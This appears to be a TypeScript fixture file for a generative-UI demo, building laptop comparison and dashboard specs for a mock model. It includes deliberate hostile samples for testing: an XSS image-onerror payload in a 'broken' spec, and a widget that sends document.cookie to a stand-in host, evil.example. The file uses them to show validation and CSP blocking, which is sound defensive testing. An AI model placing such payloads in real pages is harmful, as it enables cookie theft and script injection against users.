import type { Spec } from "@genux/schemas";
import { validateSpec } from "@genux/schemas";
import type { Item } from "./data";
import type { Comparison } from "./tools";

/** Deterministic "model output" generators used by the scripted mock model. They emit UNTRUSTED-shaped data (raw objects). */
type Raw = { root: string; elements: Record<string, { type: string; props?: Record<string, unknown>; children?: string[] }> };

const money = (n: number) => `$${n.toLocaleString("en-US")}`;

export function comparisonSpec(c: Comparison): Raw {
  const w = c.winners;
  const name = (id: string) => c.items.find((i) => i.id === id)?.name ?? id;
  return {
    root: "root",
    elements: {
      root: { type: "Card", props: { title: "Laptop comparison", description: `${c.items.length} candidates` }, children: ["badges", "metrics", "table", "actions"] },
      badges: { type: "Stack", props: { direction: "row", gap: "s" }, children: ["b1", "b2", "b3"] },
      b1: { type: "Badge", props: { label: `Cheapest: ${name(w.cheapest)}`, tone: "success" } },
      b2: { type: "Badge", props: { label: `Top rated: ${name(w.bestRated)}`, tone: "info" } },
      b3: { type: "Badge", props: { label: `Lightest: ${name(w.lightest)}`, tone: "neutral" } },
      metrics: { type: "Stack", props: { direction: "row", gap: "m" }, children: ["m1", "m2"] },
      m1: { type: "Metric", props: { label: "Lowest price", value: money(Math.min(...c.items.map((i) => i.price))), tone: "success" } },
      m2: { type: "Metric", props: { label: "Best battery", value: `${Math.max(...c.items.map((i) => i.batteryHours))} h`, tone: "info" } },
      table: {
        type: "Table",
        props: {
          columns: ["Name", "Price", "Rating", "RAM", "Battery", "Weight"],
          rows: c.items.map((i) => [i.name, money(i.price), i.rating, `${i.ramGb} GB`, `${i.batteryHours} h`, `${i.weightKg} kg`]),
        },
      },
      actions: { type: "Stack", props: { direction: "row", gap: "s" }, children: c.items.slice(0, 3).map((i) => `act-${i.id}`) },
      ...Object.fromEntries(c.items.slice(0, 3).map((i) => [`act-${i.id}`, { type: "Button", props: { label: `Details: ${i.name}`, action: "select_item", params: { id: i.id }, variant: "secondary" } }])),
    },
  };
}

export function dashboardSpec(items: Item[]): Raw {
  const avg = items.reduce((s, i) => s + i.price, 0) / Math.max(1, items.length); // empty-safe: never emit NaN/Infinity
  return {
    root: "root",
    elements: {
      root: { type: "Stack", props: { direction: "column", gap: "m" }, children: ["alert", "kpis", "table", "form"] },
      alert: { type: "Alert", props: { tone: "info", title: "Shortlist ready", message: `${items.length} laptops match your request.` } },
      kpis: { type: "Stack", props: { direction: "row", gap: "m" }, children: ["k1", "k2", "k3"] },
      k1: { type: "Metric", props: { label: "Matches", value: items.length } },
      k2: { type: "Metric", props: { label: "Average price", value: money(Math.round(avg)), tone: "info" } },
      k3: { type: "Metric", props: { label: "Top rating", value: items.length ? Math.max(...items.map((i) => i.rating)) : "n/a", tone: "success" } },
      table: { type: "Table", props: { columns: ["Name", "Category", "Price", "Rating"], rows: items.map((i) => [i.name, i.category, money(i.price), i.rating]) } },
      form: { type: "Form", props: { title: "Refine", fields: [{ name: "maxPrice", label: "Max price", type: "number", placeholder: "1500" }, { name: "category", label: "Category", type: "select", options: ["any", "ultraportable", "performance", "budget", "creator"] }], submitLabel: "Refine search", action: "refine_search" } },
    },
  };
}

export function itemDetailSpec(i: Item): Raw {
  return {
    root: "root",
    elements: {
      root: { type: "Card", props: { title: i.name, description: i.summary }, children: ["row", "tags"] },
      row: { type: "Stack", props: { direction: "row", gap: "m" }, children: ["p", "r", "bat"] },
      p: { type: "Metric", props: { label: "Price", value: money(i.price) } },
      r: { type: "Metric", props: { label: "Rating", value: i.rating, tone: "success" } },
      bat: { type: "Metric", props: { label: "Battery", value: `${i.batteryHours} h`, tone: "info" } },
      tags: { type: "Stack", props: { direction: "row", gap: "s" }, children: i.tags.map((_, n) => `t${n}`) },
      ...Object.fromEntries(i.tags.map((t, n) => [`t${n}`, { type: "Badge", props: { label: t } }])),
    },
  };
}

/** A deliberately broken spec: unknown component, an unsafe prop, a missing child, a bad action. Used to demo fail-safe validation. */
export const BROKEN_SPEC: Raw = {
  root: "root",
  elements: {
    root: { type: "Card", props: { title: "Broken on purpose" }, children: ["evil", "ghost", "btn", "ok", "missing"] },
    evil: { type: "ScriptRunner", props: { code: "alert(1)" } },
    ghost: { type: "Text", props: { text: "hello", dangerouslySetInnerHTML: { __html: "<img src=x onerror=alert(1)>" } } },
    btn: { type: "Button", props: { label: "Run!", action: "Delete Everything" } },
    ok: { type: "Text", props: { text: "This valid element still renders in lenient mode." } },
  },
};

/** OpenUI Lang program (declarative, line-oriented, forward references allowed). */
export function openUiProgram(items: Item[]): string {
  const q = (s: string) => JSON.stringify(s);
  const top = [...items].sort((a, b) => b.rating - a.rating).slice(0, 6);
  return [
    `root = Stack([header, kpis, chart, table, note])`,
    `header = Text(${q("Laptop shortlist")}, "heading")`,
    `kpis = Stack([m1, m2, m3], "row")`,
    `m1 = Metric("Matches", ${items.length})`,
    `m2 = Metric("Average price", ${q(money(Math.round(items.reduce((s, i) => s + i.price, 0) / Math.max(1, items.length))))})`,
    `m3 = Metric("Top rating", ${items.length ? Math.max(...items.map((i) => i.rating)) : 0}, "+0.2")`,
    `chart = BarChart("Price by laptop", ${JSON.stringify(top.map((i) => i.name))}, ${JSON.stringify(top.map((i) => i.price))})`,
    `table = Table(["Name", "Price", "Rating"], ${JSON.stringify(top.map((i) => [i.name, money(i.price), i.rating]))})`,
    `note = Alert("Tip", "Click a laptop in the table to compare it.", "info")`,
  ].join("\n");
}

/** Hybrid OpenUI program: catalog components + one HtmlArtifact (open-ended region). */
export function openUiHybridProgram(items: Item[]): string {
  return `${openUiProgram(items).replace("note])", "note, widget])")}\nwidget = HtmlArtifact("Budget calculator", ${JSON.stringify(budgetWidgetHtml(items))})`;
}

/** Open-ended: "model-written" interactive HTML. Pure inline CSS/JS; talks to the host only through a validated postMessage. */
export function budgetWidgetHtml(items: Item[]): string {
  const options = items.map((i) => `<option value="${i.price}">${i.name.replace(/[<>&"]/g, "")}</option>`).join("");
  return `<!doctype html><html><head><style>
body{font:14px system-ui;margin:0;padding:12px;color:#1c2333}label{display:block;margin:8px 0 2px;font-weight:600}
select,input{padding:6px;border:1px solid #c5ccdb;border-radius:6px;width:100%;box-sizing:border-box}
output{display:block;margin-top:12px;font-size:20px;font-weight:700;color:#2457d6}</style></head>
<body><h3 style="margin:0 0 6px">Budget calculator</h3>
<label for="l">Laptop</label><select id="l">${options}</select>
<label for="m">Months to save</label><input id="m" type="number" min="1" max="36" value="6">
<output id="o"></output>
<script>
const l=document.getElementById('l'),m=document.getElementById('m'),o=document.getElementById('o');
function calc(){const months=Math.max(1,Math.min(36,+m.value||1));const per=Math.ceil(+l.value/months);
o.textContent='Save $'+per+' / month';
parent.postMessage({type:'genux-widget',name:'widget_result',payload:{perMonth:per,months:months}},'*');}
l.onchange=m.oninput=calc;calc();
parent.postMessage({type:'genux-widget',name:'widget_ready'},'*');
</script></body></html>`;
}

/** Hostile open-ended output used to prove the sandbox: it tries network exfiltration and a nested frame. */
export const HOSTILE_WIDGET_HTML = `<!doctype html><html><body><p id="s">trying to escape...</p>
<iframe src="https://evil.example"></iframe>
<script>fetch('https://evil.example/steal?c='+document.cookie).catch(e=>{document.getElementById('s').textContent='network blocked by CSP'});</script></body></html>`;

export function validated(raw: Raw): Spec {
  const r = validateSpec(raw);
  if (!r.ok || !r.spec) throw new Error("builder produced an invalid spec");
  return r.spec;
}
